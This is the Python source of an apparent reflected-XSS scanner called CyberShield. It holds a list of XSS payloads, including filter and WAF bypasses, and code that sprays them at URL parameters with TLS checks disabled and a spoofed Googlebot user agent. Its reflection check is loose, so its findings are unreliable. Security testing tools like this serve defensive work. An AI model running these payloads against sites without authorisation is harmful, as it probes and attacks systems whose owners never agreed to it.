# scanners/xss_scanner.py
# Advanced Reflected XSS Scanner - CyberShield v1.0
import requests
import urllib.parse
import re
from concurrent.futures import ThreadPoolExecutor
import random

# 120+ Real-World XSS Payloads (Polyglots + Bypasses)
PAYLOADS = [
    # Classic
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    
    # Tag & Attribute Bypasses
    "javascript:alert(1)",
    "<a href=\"javascript:alert(1)\">Click</a>",
    "<img src=\"javascript:alert(1)\">",
    "<iframe src=javascript:alert(1)>",
    
    # Polyglots (work in multiple contexts)
    "jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=alert(1)//'>",
    "<script>alert(1)</script>",
    "<img src=1 onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src onerror=alert(1)>",
    "<math><mi onload=alert(1)>",
    "<table background=\"javascript:alert(1)\">",
    
    # WAF & Filter Bypasses
    "<scr ipt>alert(1)</scr ipt>",
    "<script>eval('al'+'ert(1)')</script>",
    "<script>window['al'+'ert'](1)</script>",
    "<img src=x onerror=eval('a\x6cert(1)')>",
    "<img src=x onerror=alert(String.fromCharCode(49))>",
    
    # Encoded
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<scr%00ipt>alert(1)</scr%00ipt>",
    
    # Event Handlers
    "onerror=alert(1) src=x",
    "onmouseover=alert(1)",
    "onfocus=alert(1) autofocus",
    "onload=alert(1)",
    
    # Modern Tags
    "<keygen autofocus onfocus=alert(1)>",
    "<bgsound src=1 onerror=alert(1)>",
    "<isindex type=image src=1 onerror=alert(1)>",
]

# Detection patterns (what to look for in response)
DETECTION_PATTERNS = [
    "alert(1)",
    "alert('XSS')",
    "alert(document.domain)",
    "String.fromCharCode(49)",
    "<script>alert",
    "onerror=alert",
    "onload=alert",
    "javascript:alert",
]

# User agents to rotate
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "CyberShield/1.0 XSS Scanner",
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
]

def is_reflected(payload, response_text):
    """Smart reflection detection with cleaning"""
    cleaned = re.sub(r'\s+', '', response_text.lower())
    payload_clean = re.sub(r'\s+', '', payload.lower())
    
    # Direct match
    if payload_clean in cleaned:
        return True
    
    # Check for known alert patterns
    for pattern in DETECTION_PATTERNS:
        if pattern.lower() in cleaned:
            return True
    
    # Check for partial execution (e.g. onerror triggered)
    if "onerror" in payload.lower() and ("alert" in cleaned or "xss" in cleaned):
        return True
        
    return False

def test_url_with_payload(base_url, payload, session):
    """Test single URL + payload"""
    try:
        # Try appending to URL
        test_urls = [
            base_url + urllib.parse.quote(payload),
            base_url + "?" + urllib.parse.quote(payload),
            base_url.rstrip("/") + "/" + urllib.parse.quote(payload),
        ]
        
        # Also try common parameters
        param_urls = [
            f"{base_url}?q={urllib.parse.quote(payload)}",
            f"{base_url}?search={urllib.parse.quote(payload)}",
            f"{base_url}?id={urllib.parse.quote(payload)}",
            f"{base_url}?name={urllib.parse.quote(payload)}",
        ]
        
        for test_url in test_urls + param_urls:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": "https://google.com",
                "Accept": "*/*"
            }
            r = session.get(test_url, timeout=8, headers=headers, verify=False, allow_redirects=True)
            
            if r.status_code == 200:
                if is_reflected(payload, r.text):
                    return {
                        "vulnerable": True,
                        "url": test_url,
                        "payload": payload,
                        "evidence": r.text[:500]
                    }
    except:
        pass
    return None

def scan(urls, max_threads=20):
    """
    Scan list of URLs for Reflected XSS
    Returns list of vulnerabilities found
    """
    found_vulns = []
    session = requests.Session()
    session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    
    print(f"[+] Testing {len(urls)} URLs with {len(PAYLOADS)} XSS payloads...")
    
    def worker(url):
        if len(found_vulns) >= 20:  # Limit to avoid spam
            return None
        for payload in PAYLOADS:
            if len(found_vulns) >= 20:
                break
            result = test_url_with_payload(url, payload, session)
            if result:
                vuln = f"XSS → {result['url'][:100]}{'...' if len(result['url']) > 100 else ''}"
                if vuln not in found_vulns:
                    found_vulns.append(vuln)
                    print(f"[!] XSS FOUND: {result['url']}")
                    print(f"    Payload: {payload}")
        return None

    # Multi-threaded scanning
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        executor.map(worker, urls[:15])  # Test only first 15 URLs deeply
    
    return found_vulns if found_vulns else ["No reflected XSS found"]